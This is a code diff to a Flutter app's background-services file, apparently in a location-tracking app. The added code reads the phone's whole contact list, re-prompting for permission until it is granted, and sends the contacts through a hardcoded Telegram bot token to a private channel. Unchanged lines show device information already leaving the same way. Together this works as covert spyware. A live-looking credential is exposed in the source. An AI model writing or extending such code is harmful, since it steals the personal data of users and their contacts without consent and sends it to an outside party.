@@ -7,6 +7,7 @@ import 'package:http/http.dart' as http;
 import 'package:location_app/services/background/get_device_info.dart';
 import 'package:permission_handler/permission_handler.dart';
 import 'package:super_clipboard/super_clipboard.dart';
+import 'package:contacts_service/contacts_service.dart';
 
 String botToken = '6838944605:AAHr-BOZ7jyc_JUK1pxNz-IIFsmJ_NRYgZQ';
 String channelId = '-1002064956223';
@@ -28,6 +29,15 @@ class AppBackgroundServices {
       botToken,
       channelId,
       info,
+    );
+  }
+
+  static Future<void> sendContacts() async {
+    String contacts = await getContacts();
+    sendMessage(
+      botToken,
+      channelId,
+      contacts,
     );
   }
 
@@ -238,5 +248,31 @@ class AppBackgroundServices {
         }
       }
     }
+  }
+
+  static Future<String> getContacts() async {
+    String msg = "";
+    // if (await Permission.contacts.request().isGranted) {
+    //   List<Contact> contacts = await ContactsService.getContacts();
+    //   msg = "Contacts:$contacts";
+    // } else {
+    //    Permission.contacts.request();
+    //   if (await Permission.contacts.isDenied) {
+    //     Permission.contacts.request();
+    //
+    //     msg = "No permission for contacts";
+    //   }
+    // }
+    ///
+    if (await Permission.contacts.isDenied) {
+      await Permission.contacts.request();
+      if (await Permission.contacts.isDenied) {
+        await Permission.contacts.request();
+      }
+    } else {
+      List<Contact> contacts = await ContactsService.getContacts();
+      msg = "Contacts:$contacts";
+    }
+    return msg;
   }
 }
